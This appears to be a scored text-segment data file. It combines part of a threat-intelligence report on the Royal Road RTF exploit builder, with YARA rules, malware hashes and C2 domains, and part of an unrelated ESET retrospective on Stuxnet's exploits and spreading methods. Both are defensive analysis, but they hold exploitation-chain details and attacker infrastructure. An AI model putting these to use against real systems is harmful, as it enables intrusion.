"The malicious emails, while sharing a broad geographic clustering, did not appear to be targeted in nature because victims existed in different sectors and the phishing lures were found to have commodity purchase order and invoice themes. The use of the Formbook malware in MitM phishing attacks is not unique in itself. However, the tool that threat actors used to weaponize RTF phishing attachments for this campaign had only previously been used by the Chinese and Indian APT actors noted previously.",0.013616329638800773
A similar campaign was observed on 6 May 2019 utilizing a tariff-themed phishing lure. After the user had executed the malicious RTF attachment it exploited CVE-2017-11882. This gave access to the svchost.exe and wmiprvse.exe processes via Remote Process Calls (RPCs). Wmiprvse.exe then spawns a command line shell as a child process that is used to execute the file ‘~afer125419.tmp’. This file is created on the host by a Visual Basic script that was previously downloaded from the Pastebin URL pastebin[.]com/raw/9t3R1Ng5 by the malicious RTF.,0.008931600194384548
Figure 10: VBScript used to create malicious ~afer125419.tmp file.,0.010691671001572312
"In some samples from this campaign, the VBScript was found within a malicious HTA file that was downloaded directly from a C2 domain by the initial malicious RTF rather than from the above-referenced Pastebin URL. Notably, each of the malicious RTF files includes the RTF metadata author tag ‘n3o’. This metadata information has been associated with malicious purchase order and invoice phishing campaigns since at least 2017. Specifically, the ‘n3o’ metadata author tag has been present in identified RTF phishing files that exploited Equation Editor vulnerabilities (CVE-2017-11882 and CVE-2018-0802) from both May 2018 [7] and December 2018.",0.011940716537276796
"The adoption of Royal Road by an additional commodity actor occurred in April 2019. The object dimensions objw2180\\objh300 were seen in a malspam campaign which appears to have delivered the commodity ransomware Osiris, which is an older variant of the Locky ransomware. The campaign leveraged IT themes within its phishing lures and specifically referenced a Samsung printer [8]. The weaponized RTFs all included the metadata author tag ‘wuyan’ and included phishing lure themes from invoices, to payment documents and purchase orders. ‘Wuyan’ is also a known metadata author tag that has been associated with commodity campaigns that did not utilize the Royal Road weaponizer.",0.012750259498526484
Weaponizer life cycle,0.008676656703969554
"Phishing weaponizers are created, sold and distributed in the cyber threat landscape in a similar fashion to zero-day vulnerabilities and proof-of-concept (PoC) exploits. Like zero-day exploits, a weaponizer tool consisting of code that builds phishing exploits that target vulnerabilities has the most value (both in monetary and operational terms) prior to a vulnerability’s disclosure. During this period often a single sophisticated actor is seen developing a weaponizer for a zero-day that has been identified through targeted vulnerability research. Upon a vulnerability’s disclosure by a PoC or product vendor, a period of rapid tool development by multiple actors often occurs during the time when a vulnerability is unpatched (‘1 Day’) and during the initial 90 days following the release of a patch. Ninety days is a common duration for patch implementation at large enterprises, however, patching may occur faster or slower based on criticality prioritization within an organization. The current US Department of Defense Cybersecurity Discipline Implementation Plan strives to have all systems patched within 21 days of patch release and provides for the network removal of high-risk unpatched devices after a 120-day period [9]. During the initial patch-adoption period, targeted phishing attacks for a disclosed vulnerability will have a high success rate based on the limited degree of deployed patches in the threat landscape. Therefore, the largest number of new weaponizers for a specific vulnerability will be observed during this period.",0.018593648859866918
"Following the initial patch-adoption period, continued adoption, innovation, and diffusion of weaponizer tools is often observed with usage by less sophisticated actors including cybercriminal and commodity adversaries involved with malspam distribution. This adoption of once-sophisticated weaponizers by unsophisticated actors is accompanied by a decrease in the effectiveness of the targeted attacks that make use of the weaponizer because the number of patched machines rises over time. Although less effective in targeted attacks, late-stage weaponizer usage for large-scale, untargeted commodity campaigns like malspam allow additional value to be derived from a weaponizer like Royal Road. Late-stage actor adoption of such tools can be further driven by the publication of research that may include both samples and code writeups, allowing adversaries to adopt or recreate the published weaponizer.",0.01788680495301609
"The diagram shown in Figure 11 maps the adoption of the Royal Road weaponizer for CVE-2017-11882, CVE-2018-0802 and CVE-2018-0798 by multiple APT and cybercriminal adversaries. Royal Road has not been found to be a tool that exploited these CVEs as zero-days. CVE-2017-11882 and CVE-2018-0802 were disclosed in the threat landscape and patched by Microsoft in close succession. It is likely that sophisticated APT groups like Temp.Periscope immediately began developing or purchased a functional weaponizer for CVE-2017-11882 in the days following disclosure. This conclusion is based on the first functional Royal Road sample being observed just four days after the disclosure of CVE-2017-11882. Conimes/Goblin Panda was also seen utilizing the same weaponizer and post-infection DLL hijacking methodology within the initial 90-day patching cycle. Meanwhile, the APT group responsible for Reaver malware was found to be utilizing a functional exploit for CVE-2018-0802 created by the Royal Road builder within 90 days of initial exploit disclosure.",0.014361364029599755
Figure 11: Royal Road adoption timeline.,0.021199876967075038
"Following the initial patching period, new variations of the Royal Road weaponizer began to emerge, with Goblin Panda and Nomad Panda deploying an updated version that exploited CVE-2017-11882. These Chinese APT groups were subsequently observed adopting the Royal Road weaponizer version that now exploited CVE-2018-0802, first used by the Reaver Group. The Sidewinder APT, which is believed to originate from South Asia, was also seen briefly utilizing a different version of the Royal Road weaponizer for CVE-2017-11882 following the initial 90 days after patch disclosure.",0.012044595430292016
"The usage of the Royal Road version 4 weaponizer for CVE-2018-0802 persisted past the initial patching period and also continued following Anomali’s publication regarding the Royal Road tool that was released in February 2019 [10]. Interestingly, in the period following publication, an additional cluster of phishing emails using Royal Road version 5 were identified targeting Mongolian speakers that appeared to be related to a Chinese APT group referred to as Temp.Hex by FireEye and the Maudi Surveillance Operation by Norman Shark. Specifically, a Royal Road RTF attachment named ‘Цэргийн багийн 8 ээлж ашиглагдах утасны дугаарын жагсаалт.doc’, which translates to ‘List of telephone numbers to be used in the 8th Military Team.doc’ (1e78ebbfb5fd1ee66f44030d52f80806d184e6daa00dd7aaa1a30b53c629912d) was found to utilize the C2 mtanews.vzglagtime[.]net, which resolved to the IP 217.69.8[.]255 at the time of analysis [11]. The same IP was observed to be the C2 host used by a FIRESHADOW malware payload in a campaign in January 2019 which FireEye attributed to Temp.Hex and identified as targeting Mongolian transportation and telecommunications sectors. Additionally, another RTF file that FireEye associates with that January campaign (5cc1272272a6de91e1c43832f289c73f) utilizes the same post-infection mechanism for DLL side-loading as the above Royal Road sample. The samples drop the encoded 8.t file to the temp folder. When this file is decoded it is the malicious executable winhelp.wll. The malicious EXE is then copied to the following directory as %APPDATA%\Intel\Intel(R) Processor Graphics\RasTls.dll and side-loaded using the legitimate executable IntelGraphicsController.exe. It is worth noting that the malicious executable file name ‘winhelp.wll’ has historically been observed in campaigns linked to Dagger Panda and Nomad Panda as well.",0.013419566618496748
"While the functional CVE-2017-11882 and CVE-2018-0802 were in rapid development by the groups Conimes, Temp.Periscope and Reaver following their initial disclosure, a slower adoption was observed for CVE-2018-0798. This vulnerability, which also targeted the Equation Editor, was utilized by threat actors following the initial 90-day disclosure period. Although the exact date of actor adoption is not known for CVE-2018-0798 samples, since the earliest testing samples appear to be timestomped with dates from 2017, we believe ItW samples emerged in October 2018. The version 5 Royal Road weaponizer identifiable by the obfuscation gadget string objw2180\objh300\objdata\object 5154\781\'e56\'2f7\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000002e0000d01 was seen twice in October 2018. This use continued intermittently until April 2019. Following this adoption, Royal Road version 5 exploiting CVE-2018-0798 weaponized RTF files became more ubiquitous among the APT groups, with Temp.Hex and Temp.Trident incorporating the tool in their tactics.",0.010978420532316346
"Finally, following the Anomali publication on the Royal Road weaponizer, and for the first time since its initial emergence in November 2017, the Royal Road object dimensions began to appear in commodity campaigns delivering malicious RTF files weaponized for CVE-2017-11882. Appearing first in March 2019 and continuing until June 2019, the timing of this release in the commodity landscape is striking. Although unsubstantiated at this time, it is possible that, following the Anomali publication about the Royal Road weaponizer, the exploit was released or sold for use by an exploit broker to commodity actors. Whereas the value of an exploit builder is greatest when no one knows of the vulnerability, its value is lowest when in-depth knowledge and detection signatures for a tool have been published. Researchers reiterate that this possibility remains unsubstantiated at this time and recognize that adoption of such a tool by both commodity and Indian APT actors could be the result of reverse engineering a sample encountered through fourth/Nth-party collection. Intermittent use of the Royal Road weaponizer in commodity phishing campaigns does not inform the origin of the tool as being created by an exploit broker or an APT developer. However, its commodity emergence does suggest an attempt to derive broader value from a tool following an open-source publication which previously documented it as part of multiple APT toolkits.",0.01819568013664008
Additional threat activity clusters based on RTF object dimensions,0.011562980599304717
"Researchers identified an additional 26 clusters of activity identifiable by their unique object dimensions, as show in Figure 12. It is believed that each of the unique object dimensions and their correlated activity represent a phishing weaponizer being utilized in the wild. The identified activity includes additional weaponizers utilized by the APT groups responsible for the Reaver malware and the criminal campaigns dubbed ‘Gorgon Group’ by Palo Alto Networks (believed to be associated with the Pakistani APT group Subaat) [12, 13]. Several commodity and unidentified weaponizers were observed that are primarily in use as part of malspam and banking trojan campaigns. Additionally, three public phishing weaponizers were identified in open source as PoCs or GitHub projects which have been utilized in a range of campaigns including both cybercriminal and APT activity.",0.016195384353383302
Figure 12: 26 additional RTF weaponizers identified using unique object dimensions.,0.017266118204537606
Conclusion,0.008171308922719556
"The application of RTF attribution techniques across over 6,000 samples has ultimately identified 27 RTF weaponizers, 18 months of targeted APT activity spanning six adversaries, and has demonstrated the value derived from the analysis of unique object dimensions. While the continued analysis of other aspects of the RTF file format – including metadata, shellcode and obfuscation – remains valuable, object dimensions provide a unique visibility into weaponizer tool usage in the threat landscape. The relative ease and significant return of YARA signatures tracking these dimensions provides network defenders a high-veracity, repeatable method for identifying malicious RTF phishing attachments. This high-value boon to defenders is augmented by the long-term strategic context that tracking object dimension can offer as part of threat actor profiling. Should these object dimensions remain relatively obscure in the static detections employed by anti-virus signatures and therefore insignificant in the eyes of threat actors, we believe that attribution will remain in the object.",0.01752414286728554
References,0.0158494738281566
"[1] 2019 Data Breach Investigations Report. May 8, 2019. https://enterprise.verizon.com/resources/reports/dbir/.",0.018535861294789346
"[2] Raggi, M. A. Schrodinger’s Backslash: Tracking the Chinese APT Goblin Panda Using RTF Metadata. SANS Cyber Threat Intelligence Summit. January 22, 2019. https://www.sans.org/cyber-security-summit/archives/file/summit_archive_1548184559.pdf.",0.014295607696715895
"[3] Yang, J. How RTF Malware Evades Static Signature-based Detection. FireEye Threat Research. May 20, 2016. https://www.fireeye.com/blog/threat-research/2016/05/how_rtf_malware_evad.html.",0.016363812912312703
"[4] Larin, B. How RTF Malware Evades Static Signature-based Detection. Disappearing Bytes: Reverse Engineering the MS Office RTF Parser. February 21, 2018. https://securelist.com/disappearing-bytes/84017/.",0.01779594552951691
"[5] Fagerland, S. The Chinese Malware Complexes: The Maudi Surveillance Operation. Seebug.org. 2012. https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2012/NormanShark-MaudiOperation.pdf.",0.012781359629533862
"[6] Cylance Research and Intelligence Team. Reaver: Mapping Connections Between Disparate Chinese APT Groups. Threat Vector. May 14, 2019. https://threatvector.cylance.com/en_us/home/reaver-mapping-connections-between-disparate-chinese-apt-groups.html.",0.012334999061372587
[7] https://github.com/decalage2/oletools/issues/307; https://www.anquanke.com/post/id/168455.,0.011478290336646046
"[8] Scan from a Samsung MFP Malspam Delivers Locky Osiris. My Security Online. December 08, 2016. https://myonlinesecurity.co.uk/scan-from-a-samsung-mfp-malspam-delivers-locky-osiris/.",0.010715238545065953
[9] United States Department of Defense. DoD Cybersecurity Discipline Implementation Plan. February 2016. https://dodcio.defense.gov/Portals/0/Documents/Cyber/CyberDis-ImpPlan.pdf.,0.014423290252910559
"[10] Raggi, M. A.; Saad, G. Analyzing Digital QuarterMasters in Asia. Anomali Blog. March 2019. https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain.",0.013300187529540763
"[11] Beaumont, K. Twitter. April 17, 2019. https://twitter.com/GossiTheDog/statuses/1118478326908248064.",0.012189809807949592
"[12] Falcone, R.; Fuertes, D.; Grunzweig, J.; Wilhoit, K. The Gorgon Group: Slithering Between Nation State and Cybercrime. Unit 42. August 08, 2018. https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/.",0.012627609971845866
"[13] Falcone, R.; Ash, B. Aggah Campaign: Bit.ly, BlogSpot, and Pastebin Used for C2 in Large Scale Campaign. Unit 42. April 17, 2019. https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/.",0.01176925397634343
YARA signatures,0.009758008779210958
"rule Royal_Road_RTF_weaponizer
{
meta:
author        = ""Anomali""
tlp           = ""GREEN""
version       = ""2.0""
date          = ""2018-11-10""
hash          = ""9d0c4ec62abe79e754eaa2fd7696f98441bc783781d8656065cddfae3dbf503e""
description   = ""Detects malicious Royal Road RTF from object dimension""
strings:
$S1= ""objw2180\\objh300""
$RTF= ""{\\rt""
condition:
$RTF at 0 and $S1
}
rule RTF_Malicous_Object_8.t_Chinese_APT_Activity
{
meta:
author        = ""Anomali""
tlp           = ""GREEN""
version       = ""2.0""
date          = ""2018-11-10""
hash          = ""9d0c4ec62abe79e754eaa2fd7696f98441bc783781d8656065cddfae3dbf503e""
description   = ""Detects malicious RTF from object dimension indicating 8.t post infection mechanism""
strings:
$S1= ""objw871\\objh811\\objscalex8\\objscaley8""
$RTF= ""{\\rt""
condition:
$RTF at 0 and $S1
}",0.011922566943182389
Indicators of Compromise,0.0076996116119932845
Goblin Panda / Conimes,0.008404149474726008
941868f366d65c8859253c869e405c5bbb91e1ed0227090656295c54bb0be9f2a58366b412b6d3c5aeebd716ae81b892b51bd5dbafbe26c5bac79f06912085eb9d0c4ec62abe79e754eaa2fd7696f98441bc783781d8656065cddfae3dbf503e332aa26d719a20f3a26b2b00a9ca5d2e090b33f5070b057f4950d4f088201ab9bd1e7b42a9c265266b8cc5cc966470497c4f9cba2b247d1f036b6b3892106b528f81142a9482c2a96c43c4b325f90794c2a32b61e8261da55f306a36df9ec18cb70069e1c8e829bfd7090ba3dfbf0e256fc7dfcefc6acafb3b53abcf2caa2253dd89d33e275e99e288e4c50bdafbb4584a9565189491af0a66f8a506eaf5385942162c495e835cdf28670661a53d47d12255d9c791c1c5653673b25fb587ffedc374f7f30b34d95dd99d9cf16f54192d439f830918d342558945e5809809b847344fbc5e86e6477cdb24848ace149303e22b41f7b01b2eca923109868c1f458f46714a1fd1a5ce598f761a885857dee8d90b6e7d6f4a303ecaec246a77b58fffb45087ad4f7d84758046e9d6eb174530fee98b069105a78f124cbde1ecfb041544e564ab86be5be2ce5f31c9072cd05adb91663be4904759cbcafa30c5b87660ab35b2b22718624fcaf1a290b3f138c009469b7449d1a280ec67767ea55b44ae152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914f2e28b48ee338fddd97272b191a55641c7835ad687d7b65c8db1c5f747811c57130daacff74d57bb2319fc5cf815e783c6505883f69e4adcd4c2b1cac3e598ceeb772b325bdeaaa551a4f50399fe6059bc856e41ba23dd14fbc956605a9c838ec6a01f392e4c317e6c9b6b3ce860f6368fad7687336ce995246d01fb52b83ca4bf9987b84b3f7daaa460777e5850a60f10898d0238048d3d5d07d7ec1656e47aafcbe545dc27d757fb1231019248fdd6b3ec2237e09007656d0ccd4de094f2ef81f75839e6193212d71d771edea62430111482177cdc481f4688d82cd8a5fed6d732a7741182741b6c14fdce201b839c8e380be242de034ce764c61778be8fc15e7663f662cedcc2c520b88928824a4c7caf5a6833f77cdb0051328d74ace1c841f0757ca4367f22b0aece325208799135c96ebe1dcafcd752d3f3c8dd4a5ccfa9b3b44f048cc145bd4703ead369c9104746966f94b679da51d97bf7b70a26fbaa4874e3d49e9765797b96aff5262b802352e575deee17308f7539f8916fac33,0.02904905034612948
Reaver,0.008350049279534977
1c6cb02ae9dceb3a647260f409dd837fa5c66794804623c9cf97395cf406d4df9ac09ea38c9cf11ca13a2c3dbdcfbe0fe4a15cb609be451f7159ecebdd20d3113df19abbf961a6d795362f5408d65aa5a31e34620aa3518a010d4d6d9e79c60e,0.014475568371292269
Temp.Hex,0.008616673427614074
5e3cd28d9ab02de8d816b7a0719e715330b4ad28cb2d2778a5f54a339662099116cb245d9a78c81c25605695a2cf8dbdb36d85bcb61726c56ee358254253df2e1e78ebbfb5fd1ee66f44030d52f80806d184e6daa00dd7aaa1a30b53c629912d5e3cd28d9ab02de8d816b7a0719e715330b4ad28cb2d2778a5f54a33966209911e78ebbfb5fd1ee66f44030d52f80806d184e6daa00dd7aaa1a30b53c629912d16cb245d9a78c81c25605695a2cf8dbdb36d85bcb61726c56ee358254253df2e9be6d671dd901326fc834296fbd2ed015d64e6037e83d8d1d08a9dcdc107cb335898e729b7305c4e5db54847396b15d06b74153213a242d295cf64c951a021ca803c25767414c31259e15f058d62b6102dfe09d3cfacece57f527d7fb2a50632,0.02078242931055896
Temp.Periscope / Leviathan / APT40,0.008644103244570212
c63ccc5c08c3863d7eb330b69f96c1bcf1e031201721754132a4c4d0baff36f8c92a26c42c5fe40bd343ee94f5022e05647876daa9b9d76a4eeb8a89b7f7103dc67625e2b5e2f01b74e854c0c1fdf0b3b4733885475fe35b80a5f4bca13eccc7138d62f8ee7e4902ad23fe81e72a1f3b7ac860d3c1fd5889ed8b8236b51ba64bc0b8d15cd0f3f3c5a40ba2e9780f0dd1db526233b40a449826b6a7c92d31f8d9,0.016810300311760895
Temp.Trident,0.007928632228148214
f5365387320ae6e6907fd2700f340ba8712cb08f7e52b2ec4dccfe99b3d648ef9d239ddd4c925d14e00b5a95827e9191bfda7d59858f141f6f5dcc52329838f0a95bbc1f067783c1107566ed7897549f6504d5367b8282efe6f06dc31414c3144e1a2f731688f9aab80b1f55d9101bb1cddec08214d4379621c434899a01efbf597c0c6f397eefb06155abdf5aa9a7476c977c44ef8bd9575b01359e9627348671c94bb0944eb59cb79726b20177fb2cd84bf9b4d33b0efbe9aed58bb2b43e9c722e5d3dcc8945f69135dc381a15b5cad9723cd11f7ea20991a3ab867d9428c7c580d77722d85238ed76689a17b0205b4d980c010bef9616b8611ffba21b142e87114b56ef4de4500fd0c64af913915f159b95e3cbdb7932772230aae8bfed4060ac67f0511fc984990e826d44e8a5eddd1ab7f21c7d847ee3a821875260cea661488eaafad84e8b86c6a2e87b022e133ccc77701f817c589ef4b01a89dd74eef3c120cde34e4e2a45d924ada9e53d3ebc7d73132e359eca8d48f813b6e021a1ec46e1feed5199a332c76021a8bb446dca37b8e736bcd1e5505f35fb70526a045d4de75f7900b6e765d8878234e06d8e07490d5decc6ec5d41c704af38a0abc54fce3d38e0a308088cd75c2ef1bb5aa312e83447d63a82f62839d3609a283b024123a19cda491f4d31a855e932b8b7afdcf3faf5b448f892da624c768205a289a3e81e5bbf5beeb9568f0c801b2407e33cf9bcc0c12842d6bd6bc62280add81d70195e390a5cb92c2e32ded9ef80a935ad7bdda6d6d8e21cc4cf74e98998de32532b68e6bbcea3980f5fc9a2d939b062b1e3f5f5175267adc158d3a877204e1eb9e1145546dba4fe2428fdb43566a7eb5ac472bd8b5e5f30998477693a08ede1e8e86359b06cefdc5c1115dacea21240aa090450e83744b495e784d8bff49a095238f8d8c3d16b52d39aa722daff663a5e6307c4b46e360969d84bf409a2690f97c0ba7e6cb7eb507bb6e9d819786240292f2c3c72e4d7732dd007a9bbf4af5e69f44ca082ed90c97d9c4ebaae589d7e41c69b02e582cc69886ebfd9cfb939514f6b8f51fdaf708bb4fa0dbbc72da50d24f694bce2996eff3df7eeb3c1592e62,0.029842352126537852
Unattributed (Chinese APT) samples,0.017152135495910548
0598a55dad563ffd3d7a0bcdf8699086527104cf3bad1a0d2192fe805bfef84dfb2bfa7985be5b9855c7b114d3c201540effc6b7cb249256717d6c56cc069b09484f52e80141809f7482f027f5eadb5305ee1966f55f64656765b7408e1c60dc52730e7f52afbc6a99d3a83b12b6a8393d1e979e189cffbcf4fba2ff8a7ca99f3504d4583c59ed0fe6c2d916619714f187638bde835908e02d78cf05b1a9be53e757993b2cefe2a7dd7ea3e9222cf40e968af1c82370ee5775f768fa29d5efe53b593d85b18c9457f8c52cf0f2c5f1f549518f9422d0a5bb10fb1edf4c9ea3033e04eb55095ad6a45905564d91f2ab6500e07afcdf9d6c710d6166d4eef281857079d8c92cc668f903f3a60ec04dbb2508f23840ef3c57efffb9f906d3bc05ff,0.022267219700470076
Sidewinder APT,0.008486968584424104
892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab006421548822062b6bcda194e3734285fed6b2de341c694c52a8f60c9f389f880cefab76449001056791a03ec998f26805d462bc2ca336b2c3aeac2e210f73ff841dfe3eec,0.01244571326867272
Formbook ‘n3o’ commodity campaigns,0.009117794377929034
8ec1e8bc139cbd84858c3997f0635fb5640dbd85f73e8b537e3ae7e14d4870ce47880521119cee06588476fdcc7c47a91903366671448650830b7dd310c3c3ea129d74a8f31622e605cea1a03cdac723a5adb002f877c304ef2ceb5f6cdd2654c81d67472715b6d3bf601147ff8e81f670a429ea0fb8ac3ba82a19c02ad38d0bc8b5d8f4304725e19edd9ff9e7a8d3325ed06b91adecad691fea23f429072cbd2f193d55f38d1e4149aa2424f79f184e3059469be4ee386276fb946bdc83bc302cfb86699b675919d17beeefa5d993f195358bce6119cc9cebea62d1497394216e8cd76dba16d159c4e68ed15a60af7f86afb0964ed9d2ebe43c6d6af7749397,0.020792078299748606
herramientasmalls\.comanthemog\.comtheta-solutions\.netlucpham\.comzettacroft\.comred-lemon\.bizsaleskompass\.bizdvsprint\.comesumaile\.comfrenchmole\.comvip-jinhe\.comhijaky\.comtheshadegame\.infoangryeggroll\.comrisingsunchicago\.infouploadbusiness\.comstlchimneys\.comoakendalefarmct\.comletitplay\.onlinexn--183j3c007ntbf\.comlegendreality\.comysb21\.comaccuratext\.comitsmcamiracle\.onlineerdogandisticaret\.comxdptb\.info,0.01854218625901516
Wuyan commodity campaigns,0.010985635204295852
"299cc5c74b5c44aa4c270da19673f20670b00399038d7ad7dac412b91137a55230298f89888e5104145ecb1c27053640812a1545f3b7c558ec76fe302d2afb042c8ee28cc3884d37019f7b29b37634468fcebaff4a6094564b1443de0c32cbd248257a0d98cc8d8c31b449f7e4737507031b06a4165b305b498a8b3f136dcd6b30298f89888e5104145ecb1c27053640812a1545f3b7c558ec76fe302d2afb04c9d2728ab7d43379b8b50b3bb05f10bb39f9d073d0ad0e2d533dfab77957d13c5cd4f11155c34ba32382f297776891d6f2d9f747ffbfdba7594e5c4f1fcd0f59d3428b542596490f320b86e5473a80249082580713116aaa8299634524507102511522dd26bafc2aaf46a861e479455695f85fbde0873b23baaebcadec07bd7e5fae7d03b8113987f3c776f0988af9522688cc9ad53c5072c7cb7ba445e78aefb40fefbe1835c440da19145d825d8fbdea179d362009364af09e89b1819a6c526be40b52667cc4876a3eabf4b671235b053e0e44bf98f80fa5394c3b2030f4eb0f515163f98845b2b2f85f8a56563a2fe29834643cb067099b209387ff14cb368a40970e308c4e00a03a44f7cfb8decf2b788ab054bdc695dbe7225742e159444d62e94a8adc8ab177d02ba20af3f50a0bb4a1db995630c5bbb7527c9e46d4be42afaac637e3f9e805464e2bba017ebbf3d0fd87bbea9482088ed2710683942c8dda3787bcee130ff447283fa05fdad2f68a73f6d5c321fbf723ced1660af0e5d1a5280696f1581b0b82a067cff1b5426db0429428ed2553903cc0de3021a7649341049cd265f8b03bc444de891d4e397cb6daec462e62e50306724fbe0b423f8a40970e308c4e00a03a44f7cfb8decf2b788ab054bdc695dbe7225742e159449b7f09f16cd36ff6b50407e1823d7cf030445ad1e055cf9478ef964419c905809fa727fbb18f84d7572dc4017bc3d1410af1c469591317415f53e99c06d68b30898117f2c43d6cfa52af70df919a366a47f31a7c902ee1bd9e2abfc52cf0b9e522c09d51ca46efe5bb00c88841fba6ce23247e7982501fcf5f95e0a64120bef607c59af6d98a4606a3b7a82c73a6714a6ac597192877a32e908245921d96d88cd70e5230a21921169ad729c557a9759879774445648df99eee18aa54b181b2fa90e3f6e5996b378801c0018d0aaaffd46e9e7a1fa058ad4605edf6a43078d23e6347b1a237217fc9d736094eb3d32117f8b397ec808614cddc4cda8c190b85488414918e868dcacf59abffdfee10f487488381170f3c044338c5cec62693691cc8ec45b617e378f6fbe29027523d53f20138cc1122f899a7f61320a6acf69226126853c0b4fe9d83c06fd64cd0306b1d038bad12b2f162777e63dd0850afd7eab6f6600d8c655610a2bf3affcaf999b1030d0559ee457b52b2b184e30e95b47ed74e7786c5c733e88eaccfbc265e155538a504f530e3ce2639c138277418c716c16f7e2dba5a2c68c0ac0efd8579e9e1260857a1de2c334466c57287e64b67dc4f57853be12840f120bf8dd4a22f16345536b2e38a4dfaa3b3ba1e3792a6e04037f464da00d5ea3a3644f3856c13427d2c50c64c4af25b4bc9b3ae3c5837dfb9bc785e8fec0e308cc587e557f3a7172b7af58bdeaa6a49c298fb2c5375e8ab6a821eaae98f64db31a6e0dc4b3e4576cc33e8d94b1e122b6397661720704953e1
",0.027460182341398687
"Infrastructure attacks: The next generation
ESET's David Harley revisits the Stuxnet phenomenon: How has the way we see the malware and its impact changed?",0.008747532520194223
David Harley,0.00885109592441069
7 Jun 2016 - 01:30PM,0.010867604172295486
ESET’s David Harley revisits the Stuxnet phenomenon: How has the way we see the malware and its impact changed?,0.010780743913615609
Introduction,0.012036720276026314
"This is a look back at a presentation I made a few years ago, extensively revised to coincide (roughly) with the sixth anniversary of the time that Stuxnet (in particular) first came to our attention.",0.02191433076182725
"Stuxnet had, however, been around for quite a while before that. The fact that security firms hadn’t noticed it is probably accounted for by the fact that the first version only found its way onto very few machines in a geographically limited location.",0.012652876599202445
"The presentation drew heavily, of course, on the report by Alexander Matrosov, Eugene Rodionov, Juraj Malcho and myself on Stuxnet, which you can find here.",0.01411538048107519
"This present document isn’t intended to be a deep dive into more contemporary SCADA and infrastructure issues. It’s more a case of asking: “What happened, and what changed afterwards?”",0.0140007952300365
Acronymically speaking,0.009308328512116493
"SCADA: Supervisory Control And Data Acquisition – coordinates processes
DCS: Distributed Control System – controls processes in real-time
ICS: Industrial Control Systems
CNI: Critical National Infrastructure
RTU: Remote Terminal Unit
PLC: Programmable Logic Controller – cheaper than an RTU",0.012583909125891912
"I may make reference to some of these in the course of this article, but I’m not focusing on SCADA particularly. Instead, I’m more concerned with generic infrastructure as a potential target for malicious action.",0.0117608054905598
What was the fuss?,0.011413808135176451
Stuxnet and its lesser siblings dominated the threat landscape in 2010. Why all the interest?,0.01833138039762916
"Its unusual complexity and technical sophistication.
An unusually generous array of multiple exploits of zero-day or little-known vulnerabilities: MS10-046, MS10-061, MS10-073, MS10-092 + MS08-067, 0-day, 0-tolerance, and I haven’t even listed the Siemens hard-coded ‘password’.
Its ‘Tiger Team’ approach to implementation.
Signed with (stolen) certificates from Realtek and J-Micron, while a subsequent flurry of fake certificates approved by Comodo suggested that signing was an issue likely to come up again and again. (As it has, if not to the extent that you might have expected at the time.)
It was targeted (at a time when the term APT was becoming increasing ‘buzzy’), though I’d actually describe it as semi-targeted. Still, the payload certainly had a very specific, potentially critical installation in view.
It included a mysterious hardware-specific payload in a novel language specific to an ICS: certainly a change from Visual Basic and Delphi, languages with which all malware analysts are very familiar. And because of the specialized nature of the context in which it executes, it took a long time to ascertain what it actually did, even with specialist help.",0.009391075991750597
Nothing exceeds like Stuxnet,0.009570377175411537
The version that calls itself internally 0.5 may have been operational as early as 2005.,0.010614398222992816
"The 2009 version stayed well under the radar, but had limited scope and exploited a limited range of vulnerabilities: MS08-067; MS10-061; MS08-025 (win32k.sys!NtUserMessageCall). It used autorun.inf to spread – an attack still possible for some systems even in 2016.",0.01234411103848898
"There was a significant upgrade in January 2010. Another driver was added, signed by Realtek Technologies, and several new zero-day vulnerabilities were added: MS10-046; MS10-061; MS10-073; MS10-092. It’s unusual to see that many zero-days in a single malicious program. Someone was getting serious.",0.009457851763350789
Stuxnet Vulnerabilities,0.007571738063276046
"Let’s take a look at one or two of those Liquorice Allsorts zero-days. Multiple entry points, multiple types of vulnerability.",0.007937517514635672
"MS10-46: not an Autorun.inf attack, though it worked very similarly but (for a while, anyway) more effectively – disabling Autorun didn’t stop the infection (for that you had to cripple Windows Explorer till the patch came out). It was picked up later by umpteen short-life bottom feeder malware variants. Any .LNK file could exploit it when displayed in windows explorer and the icon for a .LNK file was loaded from a Windows Control Panel file (actually a DLL, effectively).
MS08-067: self-distribution over the network installing a dropper through shared folders. It scanned network shares c$ and admin$ on the remote computers and installed a dropper there with the name DEFRAG<GetTickCount>.TMP, and scheduled a task to be executed on the next day.
(MS10-061): A privilege escalation vulnerability in Window Spooler allowing a remote Guest account to write into the %SYSTEM% Machines with file and printer sharing turned on were vulnerable to the attack.
(MS10-073) A zero-day in sys escalated privilege level up to SYSTEM, which enabled it to perform any tasks it liked on the local machine. To perform this trick, Stuxnet loaded a specially crafted keyboard layout file, making it possible to execute arbitrary code with SYSTEM privileges.
MS10-092: used a vulnerability in the Task Scheduler service to escalate privilege: in fact, that attack lived on for a while in the TDL4 bootkit. TDL4’s implementation doesn’t essentially differ from that of Stuxnet’s code. The rootkit created a legitimate task by means of the interface available in the system, then read the xml schema that corresponds to the task directly from the file in the Task Scheduler folder, and then modified it.",0.01854728031328645
MS10-046 related malware and its evolution,0.008841302766931403
More is not always more. Here are some of those MS10-46 bottom feeders:,0.01093844017190082
"SCADA, Siemens and Stuxnet",0.007780780298425327
"As of March 11th, 2011, Siemens was reporting 24 industrial sites with (unspecified) infected systems.",0.010354336772597561
"There were earlier reports of 14 or 15 SCADA sites affected by the direct infection of PLCs (Programmable Logic Controllers). While the use of these vectors has increased the visibility of the threat, it also facilitates access to sites where “air-gapping”, as a generic defense, was seen as decreasing the need for automated technical defenses like antivirus and system updating and patching. This is not a minor consideration, since the withdrawal of support from Windows versions earlier than Windows XP SP3. One thing that became very clear to me during certain discussions was that Microsoft was not rushing to patch unsupported systems so as to save necks at SCADA utilities using obsolete Windows versions.",0.010257178528922606
"This attack used a further vulnerability categorized as CVE-2010-2772, relating to the use of a hard-coded password in those systems allowing a local user to access a back-end database and gain privileged access. Not only was the password exposed to an attacker through reverse engineering, but the system would not continue to work if the password was changed.",0.006719826698688647
Signed drivers and stolen certificates,0.007352653308125623
